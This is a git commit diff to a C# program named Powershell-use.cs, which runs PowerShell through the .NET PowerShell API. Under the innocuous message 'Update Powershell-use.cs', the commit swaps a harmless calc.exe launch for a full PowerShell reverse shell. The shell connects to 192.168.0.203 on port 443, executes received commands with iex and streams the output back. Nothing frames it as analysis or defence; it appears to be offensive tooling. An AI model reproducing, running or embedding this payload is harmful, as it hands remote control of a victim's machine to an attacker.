e185ca0fd465636e3c9eb3c38613f402bd176fc6
Thirukrishnan <63901950+Thirukrishnan@users.noreply.github.com>
2024-01-23 16:55:26 +0530

    Update Powershell-use.cs

--- Powershell-use.cs
+++ Powershell-use.cs
@@ -11,7 +11,7 @@ public class Program
     {
 
         PowerShell ps1 = PowerShell.Create();
-        ps1.AddScript("Start-Process calc.exe");
+        ps1.AddScript("$client = New-Object System.Net.Sockets.TCPClient('192.168.0.203',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
         ps1.Invoke();
 
 
